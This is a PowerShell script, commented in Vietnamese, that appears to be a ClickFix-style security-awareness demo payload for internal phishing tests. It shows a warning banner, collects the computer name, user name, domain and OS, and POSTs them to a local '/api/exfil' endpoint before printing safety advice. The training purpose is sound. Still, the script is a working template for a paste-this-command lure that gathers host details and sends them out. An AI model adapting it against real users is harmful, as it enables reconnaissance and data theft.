# ============================================================
# ClickFix Awareness Demo - PowerShell Payload
# MỤC ĐÍCH: Kiểm tra nhận thức an toàn nội bộ (KHÔNG phải malware)
# Payload này CHỈ thu thập thông tin hệ thống cơ bản và gửi về
# server nội bộ để demo - không có hành vi nguy hại.
# ============================================================

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║     ⚠️  CẢNH BÁO - KIỂM TRA AN TOÀN NỘI BỘ  ⚠️     ║" -ForegroundColor Red
Write-Host "╠══════════════════════════════════════════════════════╣" -ForegroundColor Red
Write-Host "║  Bạn vừa thực thi một lệnh từ trang web không rõ   ║" -ForegroundColor Yellow
Write-Host "║  nguồn gốc. Đây là bài kiểm tra nhận thức an toàn  ║" -ForegroundColor Yellow
Write-Host "║  của công ty. KHÔNG làm điều này trong thực tế!    ║" -ForegroundColor Yellow
Write-Host "╚══════════════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

# Thu thập thông tin cơ bản (không có dữ liệu nhạy cảm)
$systemInfo = @{
    ComputerName  = $env:COMPUTERNAME
    UserName      = $env:USERNAME
    Domain        = $env:USERDOMAIN
    OS            = [System.Environment]::OSVersion.VersionString
    PSVersion     = $PSVersionTable.PSVersion.ToString()
    Timestamp     = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    TimeZone      = (Get-TimeZone).DisplayName
}

Write-Host "[DEMO] Thông tin máy tính đã được ghi nhận:" -ForegroundColor Cyan
Write-Host "  • Máy tính : $($systemInfo.ComputerName)" -ForegroundColor White
Write-Host "  • Người dùng: $($systemInfo.UserName)" -ForegroundColor White
Write-Host "  • Hệ điều hành: $($systemInfo.OS)" -ForegroundColor White
Write-Host "  • Thời gian: $($systemInfo.Timestamp)" -ForegroundColor White
Write-Host ""

# Gửi báo cáo về server demo nội bộ
try {
    $body = @{
        lure      = "awareness-test"
        hostname  = $systemInfo.ComputerName
        username  = $systemInfo.UserName
        os        = $systemInfo.OS
        output    = "DEMO: Payload thực thi thành công lúc $($systemInfo.Timestamp)"
    } | ConvertTo-Json -Compress

    $null = Invoke-WebRequest `
        -Uri "http://localhost:8080/api/exfil" `
        -Method POST `
        -Body $body `
        -ContentType "application/json" `
        -UseBasicParsing `
        -TimeoutSec 5 `
        -ErrorAction SilentlyContinue

    Write-Host "[DEMO] Báo cáo đã được gửi về server kiểm tra nội bộ." -ForegroundColor Green
} catch {
    Write-Host "[DEMO] Không thể kết nối server (bình thường nếu test offline)." -ForegroundColor Gray
}

Write-Host ""
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor DarkGray
Write-Host " LƯU Ý AN TOÀN:" -ForegroundColor Yellow
Write-Host "  1. KHÔNG bao giờ copy-paste lệnh từ trang web lạ" -ForegroundColor White
Write-Host "  2. KHÔNG chạy lệnh PowerShell khi trang web yêu cầu" -ForegroundColor White  
Write-Host "  3. Báo cáo ngay cho IT Security nếu gặp tình huống này" -ForegroundColor White
Write-Host "═══════════════════════════════════════════════════════" -ForegroundColor DarkGray
Write-Host ""
Write-Host " Liên hệ IT Security: security@company.com" -ForegroundColor Cyan
Write-Host ""
